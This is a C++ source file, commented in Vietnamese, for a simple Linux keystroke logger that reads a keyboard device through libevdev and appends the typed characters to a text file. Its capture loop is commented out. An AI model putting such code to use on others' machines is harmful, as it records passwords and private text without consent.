#include <iostream>
#include <fstream>
#include <libevdev/libevdev.h>
#include <fcntl.h>
#include <unistd.h>
#include <csignal>  // For signal handling
#include <unordered_map>

#include <string>

using namespace std;

volatile sig_atomic_t stop = 0;

void handle_signal(int sig) {
    stop = 1;  // Set the stop flag when SIGINT is received
    cout << "Set the stop flag..." << endl;
}

void make_mapTable(int code){ // ev.code
    cout << "{ " << code << ", '"; // Actived mode not flush
    std::cout << std::flush;
    cout << "'}, ";
}

// Function to convert key code to ASCII
char key_code_to_ascii(int code, bool shift_pressed) {
    // Define a map for key codes to characters (lowercase letters first)
    static std::unordered_map<int, char> key_map = {
        {16, 'q'}, {17, 'w'}, {18, 'e'}, {19, 'r'}, {20, 't'}, {21, 'y'}, {22, 'u'}, {23, 'i'}, {24, 'o'}, {25, 'p'},
        {26, '['}, {27, ']'},
        {30, 'a'}, {31, 's'}, {32, 'd'}, {33, 'f'}, {34, 'g'}, {35, 'h'}, {36, 'j'}, {37, 'k'}, {38, 'l'}, {39, ';'},
        {40, '\''}, // Single quote
        {44, 'z'}, {45, 'x'}, {46, 'c'}, {47, 'v'}, {48, 'b'}, {49, 'n'}, {50, 'm'}, {51, ','}, {52, '.'}, {53, '/'},
        {57, ' '}  // Space
    };

    // Check if the key code exists in the map
    if (key_map.find(code) != key_map.end()) {
        char letter = key_map[code];

        // If Shift is pressed, convert the character to uppercase
        return shift_pressed ? toupper(letter) : letter;
    }
    // Handle numeric keys (1-9)
    else if (code >= KEY_1 && code <= KEY_9) {
        return '1' + (code - KEY_1);
    }
    else if (code == KEY_0) {
        return '0';
    }
    // Handle spacebar
    else if (code == KEY_SPACE) {
        return ' ';
    }
    // Handle other characters (expand as needed)
    else if (code == KEY_ENTER) {
        return '\n'; // Enter key maps to newline
    }
    else if (code == KEY_BACKSPACE) {
        cout << "bspace\n";
        return '\b'; // Backspace maps to backspace character
    }
    // If the key doesn't match any known codes, return a placeholder (e.g., '?')
    return '?';
}

void removeLastCharacterFromFile(const string& filename) {
    // Mở tệp ở chế độ đọc và ghi
    ifstream inputFile(filename, ios::in);  // Mở tệp chỉ để đọc
    if (!inputFile) {
        cout << "Không thể mở tệp!" << endl;
        return;
    }

    // Đọc toàn bộ nội dung tệp vào bộ nhớ
    string fileContent((istreambuf_iterator<char>(inputFile)), istreambuf_iterator<char>());

    inputFile.close();  // Đóng tệp sau khi đọc xong

    // Kiểm tra nếu tệp không rỗng và xóa ký tự cuối cùng
    if (!fileContent.empty()) {
        fileContent.pop_back();  // Xóa ký tự cuối cùng
    }

    // Mở lại tệp để ghi lại nội dung đã thay đổi
    ofstream outputFile(filename, ios::out | ios::trunc);  // Mở tệp với chế độ ghi và xóa toàn bộ nội dung cũ
    if (!outputFile) {
        cout << "Không thể mở tệp để ghi!" << endl;
        return;
    }

    // Ghi lại nội dung đã chỉnh sửa vào tệp
    outputFile << fileContent;

    outputFile.close();  // Đóng tệp sau khi ghi xong

    cout << "Đã xóa ký tự cuối cùng trong tệp và ghi lại nội dung mới." << endl;
}


int main() {
    // Set up signal handler for SIGINT (Ctrl+C)
    signal(SIGINT, handle_signal);

    const char *device_path = "/dev/input/event4";  // Ensure this is the correct device
    int fd = open(device_path, O_RDONLY);
    if (fd == -1) {
        cerr << "Không thể mở thiết bị: " << device_path << endl;
        return 1;
    }

    struct libevdev *dev = NULL;
    if (libevdev_new_from_fd(fd, &dev) < 0) {
        cerr << "Không thể tạo libevdev từ file descriptor" << endl;
        return 1;
    }


    openFileAgain:
    ofstream logfile("file.txt", ios::app);
    if (!logfile.is_open()) {
        cerr << "Không thể mở file.txt để ghi" << endl;
        return 1;
    }

    cout << "Đang ghi lại các phím nhấn..." << endl;

    struct input_event ev;
    int shift_pressed = 0;  // To track if shift is pressed
    removeLastCharacterFromFile("file.txt");
    /*while (!stop) {  // Exit the loop when stop flag is set
        // Read the next event from the device
        if (libevdev_next_event(dev, LIBEVDEV_READ_FLAG_NORMAL, &ev) == 0) {
            // Detect shift key press/release
            if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                shift_pressed = (ev.value == 1) ? 1 : 0;
            }
            // If it's a key event
            if (ev.type == EV_KEY) {
                // If it's a key press (value == 1)
                if (ev.value == 1) {
                    // Convert the key code to ASCII
                    if(ev.code == 14) {
                        logfile.close();
                        cout << "removeLastCharacterFromFile." << endl;
                        removeLastCharacterFromFile("file.txt");
                        goto openFileAgain;
                    }else{
                        char ascii_char = key_code_to_ascii(ev.code, shift_pressed);
                        logfile << ascii_char;
                        logfile.flush();
                    }
                }

            }
        }
    }*/

    cout << "Chương trình đã dừng." << endl;

    libevdev_free(dev);
    close(fd);
    logfile.close();

    return 0;
}
